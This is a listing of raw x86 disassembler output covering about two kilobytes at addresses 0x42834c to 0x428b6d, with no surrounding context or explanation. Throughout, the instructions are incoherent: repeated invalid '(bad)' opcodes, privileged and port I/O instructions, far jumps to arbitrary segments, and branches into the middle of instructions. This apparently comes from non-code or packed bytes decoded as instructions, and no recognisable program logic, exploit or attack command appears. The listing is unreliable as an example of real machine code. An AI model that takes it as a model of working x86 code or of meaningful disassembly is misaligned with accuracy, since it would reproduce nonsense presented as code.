  42834c:	sbb    dl,BYTE PTR [esi+0x6c59b900]
  428352:	inc    ebx
  428353:	pop    ecx
  428354:	push   ebp
  428355:	and    BYTE PTR [ebx],al
  428357:	(bad)  
  428358:	fldcw  WORD PTR [esi+0x4]
  42835b:	in     eax,0xe1
  42835d:	jecxz  0x4283d9
  42835f:	bound  edi,QWORD PTR [ecx+0x14db03e7]
  428365:	(bad)  
  428366:	repz jge 0x428390
  428369:	test   BYTE PTR [edx+eiz*2],al
  42836c:	dec    esi
  42836d:	rol    BYTE PTR [ecx+0x6f6bc987],1
  428373:	(bad)  
  428374:	(bad)  
  428376:	mov    fs,esi
  428378:	mov    ah,0xe3
  42837a:	div    BYTE PTR [ebx*4+0x581b867]
  428381:	call   0xf8402a14
  428386:	mov    ecx,ss
  428388:	fnsave [eax-0x55]
  42838b:	imul   esp,DWORD PTR [eax],0xf9621423
  428391:	out    0x3,eax
  428393:	fneni(8087 only) 
  428395:	adc    ebp,esi
  428397:	mov    edi,0xbb43b6dd
  42839c:	pop    esi
  42839d:	jb     0x4283aa
  42839f:	sahf   
  4283a0:	sbb    bl,BYTE PTR [eax]
  4283a2:	rol    DWORD PTR ds:0x620517d3,cl
  4283a8:	fs sti 
  4283aa:	mov    gs,WORD PTR [ecx-0x45cb9123]
  4283b0:	fld    DWORD PTR [edi]
  4283b2:	add    al,0x0
  4283b4:	bound  eax,QWORD PTR [ebx+eiz*4]
  4283b7:	adc    ebx,ebx
  4283b9:	lods   eax,DWORD PTR ds:[esi]
  4283ba:	or     esi,esp
  4283bc:	jmp    0x102:0xbd1003a5
  4283c3:	ret    
  4283c4:	lods   al,BYTE PTR ds:[si]
  4283c6:	call   0x11c2f0c
  4283cb:	jb     0x428376
  4283cd:	fadd   QWORD PTR [ebp-0x78231ae7]
  4283d3:	lods   eax,DWORD PTR ds:[esi]
  4283d4:	lea    ecx,[eax]
  4283d6:	mov    ecx,0xfa58c1e9
  4283db:	shl    BYTE PTR [eax-0x4a527818],cl
  4283e1:	in     al,dx
  4283e2:	cmp    edi,0xffffffd2
  4283e5:	fiadd  WORD PTR [ebx-0x7a212ce0]
  4283eb:	(bad)  
  4283ed:	dec    ebx
  4283ee:	jne    0x4283d5
  4283f0:	je     0x428439
  4283f2:	je     0x4283fe
  4283f4:	jecxz  0x42840f
  4283f6:	jne    0x4283d6
  4283f8:	aam    0xa5
  4283fa:	and    al,0xfd
  4283fc:	xor    DWORD PTR [ebp-0x26c1b018],ebp
  428402:	add    BYTE PTR [ecx+eiz*4-0x33],ch
  428406:	or     esi,edx
  428408:	mov    ebp,cs
  42840a:	or     al,0x72
  42840c:	or     eax,0x49014fc
  428411:	push   ebx
  428412:	cli    
  428413:	xchg   esi,eax
  428414:	call   DWORD PTR [ebx+0x5b]
  428417:	bound  eax,QWORD PTR [eax]
  428419:	call   0x35d9:0x61651941
  428420:	jp     0x42848a
  428422:	ins    DWORD PTR es:[edi],dx
  428423:	mov    esi,0x1cfc2564
  428428:	sbb    ebx,0xef66fa6c
  42842e:	xchg   edi,eax
  42842f:	out    0xf5,al
  428431:	cmp    ah,cl
  428433:	add    al,0x62
  428435:	and    eax,0xf04e38fc
  42843a:	aas    
  42843b:	add    BYTE PTR cs:[ebx-0x22],ch
  42843f:	add    bh,dh
  428441:	xor    edi,0xffffffc0
  428444:	div    DWORD PTR [ebx+0x33]
  428447:	pop    eax
  428448:	pop    ebp
  428449:	lock pop esi
  42844b:	lds    ebx,FWORD PTR [eax]
  42844d:	mov    eax,esp
  42844f:	add    BYTE PTR [ebx-0x12],dl
  428452:	sub    DWORD PTR [ebx+0x3f66ecf1],eax
  428458:	cmp    al,0x88
  42845a:	mov    dh,0x81
  42845c:	jl     0x428439
  42845e:	xchg   ebx,eax
  42845f:	sti    
  428460:	std    
  428461:	adc    BYTE PTR [esi],al
  428463:	cmp    BYTE PTR [edi-0x4d],bl
  428466:	mov    DWORD PTR [ecx],esp
  428468:	lea    ebp,[edi+0x6b56fa71]
  42846e:	mov    DWORD PTR [ebx],ecx
  428470:	mov    edi,DWORD PTR [ecx-0x7b]
  428473:	imul   DWORD PTR [edx-0x6c]
  428476:	(bad)  
  428478:	mov    eax,esi
  42847a:	add    al,0x7
  42847c:	test   BYTE PTR [eax],0x4b
  42847f:	fild   DWORD PTR [ebx+0x39de8fc0]
  428485:	cmp    esi,DWORD PTR [ebp+esi*8+0x6a]
  428489:	fisttp WORD PTR [eax-0x65]
  42848c:	push   ebp
  42848d:	pop    esi
  42848e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42848f:	xor    al,0xbb
  428491:	mov    edi,DWORD PTR [ecx+edi*1-0x73]
  428495:	add    al,0x73
  428497:	loopne 0x428446
  428499:	or     al,0xb
  42849b:	data16 ds sbb al,0x96
  42849f:	(bad)  [eax-0x4b50075]
  4284a5:	(bad)
  4284a8:	push   ebx
  4284a9:	push   esi
  4284aa:	ins    BYTE PTR es:[edi],dx
  4284ab:	fs jge 0x4284d2
  4284ae:	sti    
  4284af:	inc    ebp
  4284b0:	cmp    eax,0xfa972744
  4284b5:	imul   esp,DWORD PTR [edx+0x42],0x407bffac
  4284bc:	add    DWORD PTR [esi+eax*4+0x3c],0xffffffce
  4284c1:	xchg   bl,dl
  4284c3:	outs   dx,BYTE PTR ds:[esi]
  4284c4:	cmp    DWORD PTR [esi+eax*4-0x28],esi
  4284c8:	mov    esp,esi
  4284ca:	cmp    BYTE PTR [edi],al
  4284cc:	cmp    BYTE PTR ds:0xffbe5366,dl
  4284d2:	fiadd  WORD PTR [eax]
  4284d4:	mov    cl,0x2a
  4284d6:	cmp    BYTE PTR [eax-0x54],al
  4284d9:	add    edx,edi
  4284db:	jl     0x4284b7
  4284dd:	pop    ss
  4284de:	xor    cl,ch
  4284e0:	add    BYTE PTR [ebx],ch
  4284e2:	add    BYTE PTR [edx],dh
  4284e4:	outs   dx,BYTE PTR ds:[esi]
  4284e5:	cmp    DWORD PTR ds:0xffbe310a,edx
  4284eb:	fiadd  WORD PTR [eax]
  4284ed:	mov    cl,0x3
  4284ef:	mov    dl,0x41
  4284f1:	sub    eax,0xf5410815
  4284f6:	mov    edi,0x4fd51012
  4284fb:	lods   al,BYTE PTR gs:[esi]
  4284fd:	loopne 0x428522
  4284ff:	mov    ah,0x1f
  428501:	or     eax,DWORD PTR [ecx+esi*2]
  428504:	add    BYTE PTR ds:0xd6ef222e,al
  42850a:	pop    esp
  42850b:	and    BYTE PTR [eax],bh
  42850d:	(bad)  
  42850e:	push   ecx
  42850f:	xchg   ebp,eax
  428510:	jl     0x4284ac
  428512:	xchg   BYTE PTR [edi+0x30],cl
  428515:	(bad)  
  428516:	jmp    DWORD PTR [edx-0x45]
  428519:	ror    DWORD PTR [ebx],cl
  42851b:	fst    DWORD PTR [ecx]
  42851d:	adc    DWORD PTR [edi+0x18772890],eax
  428523:	bound  eax,QWORD PTR [eax-0x2]
  428526:	cs or  eax,0x46ac3e93
  42852c:	loope  0x4284e6
  42852e:	std    
  42852f:	dec    ecx
  428530:	fld    DWORD PTR [edi]
  428532:	inc    ebx
  428533:	sub    esp,esp
  428535:	out    0x3b,al
  428537:	or     al,0x49
  428539:	imul   edi,DWORD PTR [eax],0xad9e958d
  42853f:	in     al,0x9a
  428541:	xlat   BYTE PTR ds:[ebx]
  428542:	mov    WORD PTR [esp+ecx*8+0x20],fs
  428546:	fadd   DWORD PTR [eax]
  428548:	sub    ebx,DWORD PTR [edx]
  42854a:	call   0x3702:0x4259d38c
  428551:	jmp    0x56773365
  428556:	sbb    edi,DWORD PTR [edi-0x5e]
  428559:	int3   
  42855a:	jmp    0x9dbf:0x7c095784
  428561:	fdivr  DWORD PTR ds:0xe79d09db
  428567:	jp     0x428587
  428569:	lds    ebp,FWORD PTR [ebx+0x62af7a03]
  42856f:	cmp    BYTE PTR [ecx+0x79],bh
  428572:	push   esp
  428573:	test   al,0x21
  428575:	fldenv [esp+eax*2-0x9]
  428579:	fcom   QWORD PTR ds:0x651a0844
  42857f:	xlat   BYTE PTR cs:[ebx]
  428581:	fild   WORD PTR [eax-0x18622d78]
  428587:	sub    ecx,DWORD PTR [esi-0x2b]
  42858a:	mov    dl,0x37
  42858c:	cmp    bl,BYTE PTR ds:0x163936b6
  428592:	out    0xb1,al
  428594:	ds inc edx
  428596:	push   ds
  428597:	sub    BYTE PTR [ecx],0x55
  42859a:	inc    esi
  42859b:	xor    BYTE PTR [edx+0x227fe79d],0xcf
  4285a2:	xlat   BYTE PTR ds:[ebx]
  4285a3:	sub    edx,edx
  4285a5:	inc    edi
  4285a6:	jp     0x4285df
  4285a8:	dec    esi
  4285a9:	fld    QWORD PTR [eax]
  4285ab:	cli    
  4285ac:	add    BYTE PTR [edi-0x1db50077],bl
  4285b2:	leave  
  4285b3:	inc    esp
  4285b4:	jmp    0xe5b6cd9b
  4285b9:	cmc    
  4285ba:	push   esi
  4285bb:	jo     0x428553
  4285bd:	outs   dx,BYTE PTR ds:[esi]
  4285be:	ficomp DWORD PTR [edx+0x2a]
  4285c1:	mov    bl,0x5b
  4285c3:	in     eax,dx
  4285c4:	push   0xe8fee18a
  4285c9:	popa   
  4285ca:	inc    edi
  4285cb:	shr    al,0x12
  4285ce:	clc    
  4285cf:	push   0x9905b5
  4285d4:	mov    eax,0xc6e921b0
  4285d9:	stos   BYTE PTR es:[edi],al
  4285da:	push   edx
  4285db:	cli    
  4285dc:	ins    DWORD PTR es:[edi],dx
  4285dd:	push   ds
  4285de:	into   
  4285df:	add    al,0xdb
  4285e1:	and    DWORD PTR [edx],esp
  4285e3:	mov    esi,0x44c2cd91
  4285e8:	jmp    0x904144a3
  4285ed:	cmp    edx,ebp
  4285ef:	cmp    ebp,edi
  4285f1:	xor    al,0x5d
  4285f3:	rcr    DWORD PTR [ebp+0x48],0xc1
  4285f7:	add    al,0xe8
  4285f9:	popa   
  4285fa:	(bad)  [ebx-0x5a9d694]
  428600:	into   
  428601:	xor    DWORD PTR [esi-0x68d3a00],edi
  428607:	movaps XMMWORD PTR [esi+0x5c],xmm4
  42860b:	shl    DWORD PTR [edx+ebx*8+0x50],1
  42860f:	cld    
  428610:	scas   al,BYTE PTR es:[edi]
  428611:	add    BYTE PTR [ecx+eax*2+0x6f],dh
  428615:	xchg   esp,eax
  428616:	popa   
  428617:	fld    DWORD PTR [ebx+0x6cc9c0a9]
  42861d:	sub    eax,0xa993e05e
  428622:	scas   al,BYTE PTR es:[edi]
  428623:	xchg   esp,eax
  428624:	push   esp
  428625:	add    BYTE PTR [eax-0x7c138004],dl
  42862b:	push   esp
  42862c:	cli    
  42862d:	jmp    DWORD PTR [ebp+0x24]
  428630:	lock ror DWORD PTR [edx],0xdb
  428634:	test   BYTE PTR [ebx-0x7fff27f5],cl
  42863a:	dec    esi
  42863b:	pop    ecx
  42863c:	jno    0x428682
  42863e:	sti    
  42863f:	fadd   QWORD PTR ds:0xd85a86
  428645:	add    al,bl
  428647:	add    eax,0x5ea5ff2a
  42864c:	xchg   BYTE PTR [eax+0xe],ah
  42864f:	sbb    dl,bh
  428651:	mov    WORD PTR [esi],ss
  428653:	xor    bl,0xff
  428656:	jl     0x428658
  428658:	dec    esp
  428659:	cmp    al,0x4d
  42865b:	or     ecx,DWORD PTR [ebp+eax*4-0x9eead]
  428662:	fild   DWORD PTR [ecx+0xa8b69fa]
  428668:	scas   al,BYTE PTR es:[edi]
  428669:	push   0x69fa180e
  42866e:	jnp    0x42867a
  428670:	adc    al,0x64
  428672:	cwde   
  428673:	pop    ss
  428674:	cli    
  428675:	test   BYTE PTR [eax],al
  428677:	retf   
  428678:	and    DWORD PTR [edi],0xffffff8d
  42867b:	push   es
  42867c:	test   ebx,esi
  42867e:	dec    DWORD PTR [ebx+ebx*2+0xd2ef894]
  428685:	not    BYTE PTR [eax-0x30]
  428688:	lahf   
  428689:	call   0xf64fd52c
  42868e:	test   ebx,edi
  428690:	mov    DWORD PTR [edi],ecx
  428692:	push   DWORD PTR [esi]
  428694:	xchg   DWORD PTR [esi+0x44],esp
  428697:	dec    ebx
  428698:	pop    esp
  428699:	test   al,bh
  42869b:	into   
  42869c:	or     al,0xf6
  42869e:	push   eax
  42869f:	bound  ebp,QWORD PTR [ebx+0xa]
  4286a2:	cmp    BYTE PTR [ebx+0x0],dh
  4286a5:	add    eax,0x9552285
  4286aa:	jg     0x4286d1
  4286ac:	inc    ebp
  4286ad:	mov    esp,0xaef5057e
  4286b2:	cwde   
  4286b3:	or     DWORD PTR ds:0xc766f1a9,ebx
  4286b9:	jp     0x42871f
  4286bb:	outs   dx,DWORD PTR ds:[esi]
  4286bc:	cmp    dh,0x8
  4286bf:	pop    edi
  4286c0:	lock test al,0x43
  4286c3:	bound  edx,QWORD PTR [edi+0x2c92a10f]
  4286c9:	mov    edx,0xaa4205ff
  4286ce:	add    eax,0x3a057
  4286d3:	bound  ebx,QWORD PTR [edi-0xb]
  4286d6:	imul   ebx,DWORD PTR [esi],0x40
  4286d9:	aad    0xaf
  4286db:	add    BYTE PTR [ebx-0x6e],ah
  4286de:	inc    edi
  4286df:	mov    edi,0x8128b70f
  4286e4:	mov    ss,WORD PTR [edx+edi*8-0x33906a01]
  4286eb:	push   edx
  4286ec:	cli    
  4286ed:	inc    ebx
  4286ee:	mov    ch,0x43
  4286f0:	bound  ecx,QWORD PTR [ebx+0xb]
  4286f3:	cmp    BYTE PTR [eax-0x80],dl
  4286f6:	(bad)  
  4286f7:	mov    cs:0xdf8d57ef,al
  4286fd:	push   ss
  4286fe:	cmp    ebx,edi
  428700:	gs mov ecx,0xfcdd2c12
  428706:	add    al,0x62
  428708:	add    esp,esp
  42870a:	mov    bl,0x43
  42870c:	bound  ebx,QWORD PTR [edx+0x4c5285f]
  428712:	add    eax,0xb5505f89
  428717:	inc    ebx
  428718:	(bad)  
  428719:	(bad)  [edi-0x18272b5f]
  42871f:	xchg   dl,dh
  428721:	xchg   cl,ch
  428723:	add    esp,DWORD PTR [edx+0x5e]
  428726:	call   0xe734:0x835e152b
  42872d:	sbb    BYTE PTR [eax],al
  42872f:	sar    BYTE PTR [edi-0x13],0x64
  428733:	(bad)  
  428734:	adc    DWORD PTR [eax-0x595b31e9],ebp
  42873a:	bound  ecx,QWORD PTR [esi]
  42873c:	jmp    0x18df:0x3a7e7
  428743:	shl    bl,cl
  428745:	inc    ebx
  428746:	adc    BYTE PTR [esi+edi*4-0x7f0c3359],ch
  42874d:	retf   0xbcec
  428750:	fbstp  TBYTE PTR [eax+eiz*1-0x36]
  428754:	mov    ch,BYTE PTR [esi]
  428756:	pushf  
  428757:	adc    eax,DWORD PTR [esi+0x79b82d1f]
  42875d:	cs ret 
  42875f:	mov    ds:0x2063d703,eax
  428764:	ss cdq 
  428766:	push   ecx
  428767:	add    BYTE PTR [edi],bh
  428769:	push   esi
  42876a:	push   ebx
  42876b:	add    edi,DWORD PTR [esi-0x5e]
  42876e:	loope  0x4287c4
  428770:	inc    ebx
  428771:	ficomp WORD PTR [eax]
  428773:	jge    0x42877f
  428775:	dec    ebp
  428776:	sbb    DWORD PTR [edx-0x1adf2076],eax
  42877c:	xor    ebp,DWORD PTR [ecx-0x71]
  42877f:	retf   0x6205
  428782:	fldenv [ecx+ecx*4+0x34]
  428786:	push   ebp
  428787:	retf   
  428788:	xor    ebp,edx
  42878a:	icebp  
  42878b:	daa    
  42878c:	mov    ebp,0x2c5053d6
  428791:	in     al,0x99
  428793:	add    cl,ch
  428795:	loop   0x4287ed
  428797:	leave  
  428798:	lods   al,BYTE PTR ds:[esi]
  428799:	jno    0x4287ef
  42879b:	push   ecx
  42879c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42879d:	dec    ebx
  42879e:	adc    DWORD PTR [eax],0xfa005e29
  4287a4:	add    BYTE PTR ds:[ecx],bh
  4287a7:	mov    bh,0xfd
  4287a9:	xor    eax,0xe968d9f4
  4287ae:	popa   
  4287af:	fld    DWORD PTR [eax-0x3de2494]
  4287b5:	jbe    0x4287e8
  4287b7:	test   eax,0x533224c1
  4287bc:	add    cl,ch
  4287be:	popa   
  4287bf:	rol    ch,1
  4287c1:	pop    esi
  4287c2:	xor    esi,esp
  4287c4:	in     al,0xfb
  4287c6:	mov    eax,ds:0xdd598750
  4287cb:	push   ebx
  4287cc:	cli    
  4287cd:	mov    ebp,0xa48babc4
  4287d2:	jne    0x42877d
  4287d4:	stc    
  4287d5:	mov    esp,0x21845e8d
  4287da:	jae    0x428830
  4287dc:	cli    
  4287dd:	mov    ecx,0x914538b
  4287e2:	dec    esp
  4287e3:	cdq    
  4287e4:	add    BYTE PTR [esi+eiz*1-0x1c],ch
  4287e8:	inc    ebx
  4287e9:	lods   al,BYTE PTR ds:[esi]
  4287ea:	inc    ebp
  4287eb:	stos   DWORD PTR es:[edi],eax
  4287ec:	stc    
  4287ed:	(bad)  
  4287ef:	fild   WORD PTR [eax-0x17]
  4287f2:	imul   eax,eax,0x5830f7a7
  4287f8:	or     al,0xcd
  4287fa:	lods   al,BYTE PTR ds:[esi]
  4287fb:	pushf  
  4287fc:	add    cl,dl
  4287fe:	and    al,0x89
  428800:	add    ecx,ebp
  428802:	icebp  
  428803:	fstp   DWORD PTR [ecx+0x37]
  428806:	sub    eax,0x34be21
  42880b:	aad    0x3d
  42880d:	jle    0x42880f
  42880f:	pop    ds
  428810:	add    al,0xa0
  428812:	xor    BYTE PTR [edi+0x2780fa21],dl
  428818:	pusha  
  428819:	(bad)  
  42881a:	dec    DWORD PTR [ebx+0x27]
  42881d:	push   eax
  42881e:	push   edi
  42881f:	mov    al,0x9d
  428821:	bound  eax,QWORD PTR [eax]
  428823:	mov    al,0x7
  428825:	pop    eax
  428826:	sub    ebp,0xffffffd4
  428829:	add    eax,0x30b6ca44
  42882e:	ins    BYTE PTR es:[edi],dx
  42882f:	aas    
  428830:	aad    0xe8
  428832:	out    0x87,eax
  428834:	or     esi,esi
  428836:	mov    ds:0x3e7943,eax
  42883b:	jle    0x4287d9
  42883d:	add    eax,0xd51984
  428842:	add    BYTE PTR [eax+0xc],cl
  428845:	test   dh,dh
  428847:	mov    esi,0xceff4deb
  42884c:	das    
  42884d:	or     al,0x40
  42884f:	mov    ebx,0xff6c44b6
  428854:	fild   DWORD PTR [ebx-0x4bcfdf40]
  42885a:	fsubr  st,st(1)
  42885c:	sbb    edi,edx
  42885e:	mov    dh,BYTE PTR [ebx-0xc]
  428861:	sti    
  428862:	sti    
  428863:	inc    esp
  428864:	or     eax,DWORD PTR [edx+0x3e6fc30d]
  42886a:	add    bl,bl
  42886c:	mov    ebp,0xbb00a2e8
  428871:	fucomi st,st(0)
  428873:	in     al,dx
  428874:	pusha  
  428875:	or     esi,esi
  428877:	mov    eax,DWORD PTR [esi-0x74bb99e9]
  42887d:	into   
  42887e:	shr    al,1
  428880:	ds add al,0x1
  428883:	add    bh,bh
  428885:	xchg   esp,eax
  428886:	add    eax,0xff4a6284
  42888b:	jmp    DWORD PTR [edx-0x45]
  42888e:	ds call 0x47efcd
  428894:	fiadd  WORD PTR [eax+0x41698400]
  42889a:	(bad)  
  42889b:	jmp    edi
  42889d:	hlt    
  42889e:	call   0x32b1ab2
  4288a3:	(bad)  
  4288a4:	and    eax,0x5e153141
  4288a9:	dec    esi
  4288aa:	mov    esi,0x1d7be8ff
  4288af:	mov    ds:0x8430580e,al
  4288b4:	and    al,BYTE PTR [eax-0x7e]
  4288b7:	in     al,dx
  4288b8:	bound  eax,QWORD PTR [eax-0x2]
  4288bb:	test   ah,ch
  4288bd:	inc    ebp
  4288be:	in     eax,0x52
  4288c0:	xchg   ebp,eax
  4288c1:	sub    bh,bh
  4288c3:	addr16 xchg esi,eax
  4288c5:	sbb    al,0xc2
  4288c7:	(bad)  
  4288c8:	fmul   QWORD PTR [ebp+0x3e]
  4288cb:	push   cs
  4288cc:	and    al,BYTE PTR [eax-0x7b]
  4288cf:	or     eax,0xffc292d6
  4288d4:	add    ah,al
  4288d6:	arpl   WORD PTR ds:0x8340266e,si
  4288dc:	shl    BYTE PTR [ebp-0x4c],0x41
  4288e0:	add    BYTE PTR [edx+0x40],ah
  4288e3:	ins    BYTE PTR es:[edi],dx
  4288e4:	inc    eax
  4288e5:	ss je  0x4288e6
  4288e8:	jle    0x428895
  4288ea:	out    0x1c,eax
  4288ec:	repz pop ss
  4288ee:	fild   QWORD PTR [edi]
  4288f0:	lahf   
  4288f1:	push   esi
  4288f2:	fs ret 0xdeff
  4288f6:	add    BYTE PTR [eax],al
  4288f8:	test   cl,cl
  4288fa:	inc    eax
  4288fb:	(bad)  
  4288fc:	push   DWORD PTR [ebp-0x70]
  4288ff:	xor    DWORD PTR ds:0xc3f7d902,edx
  428905:	gs jnp 0x428928
  428908:	mov    al,ds:0x6337d9a1
  42890d:	mov    ?,WORD PTR [ebp+0xd140423]
  428913:	push   esp
  428914:	enter  0x4f45,0xf8
  428918:	popf   
  428919:	aas    
  42891a:	mov    cl,0xbf
  42891c:	mov    ch,0x66
  42891e:	fsub   st,st(7)
  428920:	jl     0x428947
  428922:	inc    ecx
  428923:	push   ecx
  428924:	das    
  428925:	sub    DWORD PTR [esi+0x64],ecx
  428928:	inc    ebx
  428929:	xchg   esi,eax
  42892a:	iret   
  42892b:	xchg   edx,eax
  42892c:	push   ss
  42892d:	shl    bh,cl
  42892f:	daa    
  428930:	add    al,0xed
  428932:	pusha  
  428933:	clc    
  428934:	mov    DWORD PTR ds:0xb67255,0xfe5ea8ab
  42893e:	mov    eax,ds:0xfa0423bd
  428943:	arpl   WORD PTR [edx+0x3],bx
  428946:	bound  edx,QWORD PTR [eax+ebp*1-0x49]
  42894a:	cmp    BYTE PTR [edx],al
  42894c:	in     eax,dx
  42894d:	(bad)  
  42894e:	dec    ecx
  42894f:	xchg   ebp,eax
  428950:	out    0x64,eax
  428952:	mov    esi,0xdf03abca
  428957:	inc    esi
  428958:	mov    ch,0xe0
  42895a:	out    dx,al
  42895b:	pop    esp
  42895c:	or     al,0x64
  42895e:	arpl   cx,bx
  428960:	out    0x1b,eax
  428962:	data16 aad 0xe7
  428965:	add    edx,edi
  428967:	push   esp
  428968:	les    edx,FWORD PTR [ecx+0x67]
  42896b:	(bad)  
  42896d:	fsub   DWORD PTR ds:0x21b56bc1
  428973:	fld    DWORD PTR [edx]
  428975:	test   BYTE PTR [ecx-0x43],0xa3
  428979:	add    esi,DWORD PTR [edx+ebp*8+0x54ce5a00]
  428980:	mov    eax,0x99b15d
  428985:	shr    esi,1
  428987:	int3   
  428988:	stc    
  428989:	fcompp 
  42898b:	adc    al,0xe9
  42898d:	mov    dl,BYTE PTR [edx-0x599a05b0]
  428993:	lds    edx,FWORD PTR [edx]
  428995:	mov    edi,0xe66e4ba1
  42899a:	pop    ecx
  42899b:	sahf   
  42899c:	sti    
  42899d:	mov    dh,0x0
  42899f:	test   DWORD PTR [esi+edi*8],esi
  4289a2:	stc    
  4289a3:	mov    eax,ds:0x25a98499
  4289a8:	rcl    WORD PTR [edx+0x36c0fb60],0x24
  4289b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289b1:	test   DWORD PTR [ebx+esi*1+0x4272548c],eax
  4289b8:	int3   
  4289b9:	in     al,0x81
  4289bb:	out    0x3d,eax
  4289bd:	gs loope 0x428a21
  4289c0:	fst    DWORD PTR [edx+0x62]
  4289c3:	aaa    
  4289c4:	pop    esi
  4289c5:	lea    ecx,ds:0xe9fa4ebe
  4289cb:	jns    0x428a3a
  4289cd:	(bad)  
  4289ce:	call   0x58fe834
  4289d3:	adc    BYTE PTR ds:0xd95e61b5,dh
  4289d9:	test   DWORD PTR [ecx-0x7c],ebx
  4289dc:	fiadd  DWORD PTR [eax]
  4289de:	jmp    0x5dcfd8be
  4289e3:	mov    edx,0x61e9036e
  4289e8:	stos   BYTE PTR es:[edi],al
  4289e9:	mov    ebp,DWORD PTR [ebp-0x40b0237b]
  4289ef:	push   es
  4289f0:	pop    ebp
  4289f1:	jno    0x428998
  4289f3:	popa   
  4289f4:	inc    ecx
  4289f5:	aas    
  4289f6:	add    bh,bl
  4289f8:	sti    
  4289f9:	cmc    
  4289fa:	mov    ecx,0xd66d
  4289ff:	(bad)  
  428a00:	and    BYTE PTR [esi],bl
  428a02:	jb     0x428a04
  428a04:	inc    ebp
  428a05:	aad    0x0
  428a07:	inc    eax
  428a08:	xor    dl,BYTE PTR [edx+0x41878df9]
  428a0e:	add    dl,BYTE PTR [eax-0x5f]
  428a11:	(bad)  
  428a12:	push   0xfa218f4c
  428a17:	(bad)  
  428a18:	es mov ah,0xa
  428a1b:	inc    eax
  428a1c:	dec    ebx
  428a1d:	iret   
  428a1e:	lock test ebp,esi
  428a21:	adc    DWORD PTR [eax],0xffffffff
  428a24:	push   ss
  428a25:	adc    al,0xc
  428a27:	inc    eax
  428a28:	cmp    ecx,DWORD PTR [ecx-0x51]
  428a2b:	add    BYTE PTR [ebx],cl
  428a2d:	fdiv   DWORD PTR [ebx+0x9]
  428a30:	push   ebp
  428a31:	cld    
  428a32:	adc    ebx,DWORD PTR [eax+0x32fa1809]
  428a38:	test   edi,ecx
  428a3a:	mov    esi,0x5c01705e
  428a3f:	ret    
  428a40:	push   esi
  428a41:	shr    ah,1
  428a43:	and    edi,0xffffffff
  428a46:	jg     0x428a34
  428a48:	repz aad 0x0
  428a4b:	add    BYTE PTR ds:0x3ef98323,dl
  428a51:	mov    WORD PTR [esi],ds
  428a53:	or     BYTE PTR [eax+0xa],al
  428a56:	jmp    0x11a426e
  428a5b:	lea    eax,[edi+0x34]
  428a5e:	inc    eax
  428a5f:	add    al,0xcb
  428a61:	xlat   BYTE PTR ds:[ebx]
  428a62:	cmc    
  428a63:	jne    0x428a28
  428a65:	into   
  428a66:	int    0x50
  428a68:	add    ch,ah
  428a6a:	cli    
  428a6b:	xor    edi,DWORD PTR [edi+ebp*8]
  428a6e:	adc    edi,edx
  428a70:	mov    eax,0x43adb662
  428a75:	(bad)  
  428a76:	fiadd  DWORD PTR [ecx+0x77]
  428a79:	test   edx,edx
  428a7b:	retf   0xe959
  428a7e:	aam    0xd0
  428a80:	mov    ebp,0x86d9425e
  428a85:	jle    0x428a45
  428a87:	sbb    DWORD PTR [eax+0xc],ebp
  428a8a:	adc    BYTE PTR [edx+0x55],bh
  428a8d:	cli    
  428a8e:	sub    BYTE PTR [ebx+edi*8+0x55],bl
  428a92:	and    al,0x7a
  428a94:	inc    ebp
  428a95:	jmp    0xc0a8:0xacf1f010
  428a9c:	imul   esp,DWORD PTR [esi-0x1ead2c0],0x2e
  428aa3:	mov    esi,0xb980e6ff
  428aa8:	or     cl,bl
  428aaa:	mov    BYTE PTR ds:0x2c6b0cdd,bl
  428ab0:	xchg   DWORD PTR [edx],edx
  428ab2:	mov    eax,0x801b5a42
  428ab7:	into   
  428ab8:	push   eax
  428ab9:	lods   al,BYTE PTR ds:[esi]
  428aba:	jmp    0x428b33
  428abc:	imul   cl
  428abe:	and    eax,0x409e6bc2
  428ac3:	jns    0x428ab6
  428ac5:	cli    
  428ac6:	jmp    0x23c8:0xc9620032
  428acd:	add    BYTE PTR [edx-0x4b],ch
  428ad0:	inc    esp
  428ad1:	or     ebx,esi
  428ad3:	syscall 
  428ad5:	add    BYTE PTR [edx-0x71],ah
  428ad8:	shl    DWORD PTR [ebp+0x60],cl
  428adb:	dec    edi
  428adc:	dec    ecx
  428add:	dec    edi
  428ade:	adc    DWORD PTR [ebp+0x708223c8],edi
  428ae4:	aam    0x52
  428ae6:	cmp    bl,bh
  428ae8:	sub    edx,DWORD PTR ds:0xc3f6d95e
  428aee:	popf   
  428aef:	pop    edi
  428af0:	(bad)  [ebx-0xf18668e]
  428af6:	call   0x9409:0xc3446498
  428afd:	(bad)  
  428afe:	jge    0x428adb
  428b00:	xor    DWORD PTR [ecx+0x69],ecx
  428b03:	xchg   ebp,eax
  428b04:	adc    BYTE PTR [ecx-0x381f1a7e],al
  428b0a:	inc    ecx
  428b0b:	in     eax,dx
  428b0c:	push   ss
  428b0d:	pop    ds
  428b0e:	mov    bh,0xbf
  428b10:	jecxz  0x428b90
  428b12:	sahf   
  428b13:	cmc    
  428b14:	or     edx,esp
  428b16:	in     al,0x94
  428b18:	add    edx,DWORD PTR [eax]
  428b1a:	or     ecx,DWORD PTR [ecx]
  428b1c:	push   esp
  428b1d:	enter  0xff3d,0xec
  428b21:	(bad)  
  428b22:	leave  
  428b23:	xchg   ebp,eax
  428b24:	out    0x0,eax
  428b26:	and    ebp,DWORD PTR [ecx+0x54112d11]
  428b2c:	test   al,0xb6
  428b2e:	pop    ds
  428b2f:	dec    esp
  428b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b31:	(bad)  
  428b32:	add    BYTE PTR [edi-0x2b],bh
  428b35:	mov    DWORD PTR fs:[ecx-0xf],0xf59e7937
  428b3d:	jecxz  0x428ba9
  428b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b40:	mov    ebp,0xdc3d0423
  428b45:	sub    esp,DWORD PTR [eax+0x42e6d9a1]
  428b4b:	xchg   edx,eax
  428b4c:	mov    ds:0x18e75462,eax
  428b51:	aad    0x1
  428b53:	fcom   DWORD PTR ds:0xc6bdf653
  428b59:	mov    ds:0xba4dd03,eax
  428b5e:	sbb    BYTE PTR [edx+0x49],cl
  428b61:	mov    dh,0xc7
  428b63:	mov    ch,0x5e
  428b65:	add    DWORD PTR [edi],esp
  428b67:	dec    ecx
  428b68:	lods   eax,DWORD PTR ds:[esi]
  428b69:	imul   DWORD PTR [esi]
  428b6b:	jbe    0x428bc2
  428b6d:	rcr    DWORD PTR [ebx+eiz*2-0x73e141b1],0x45
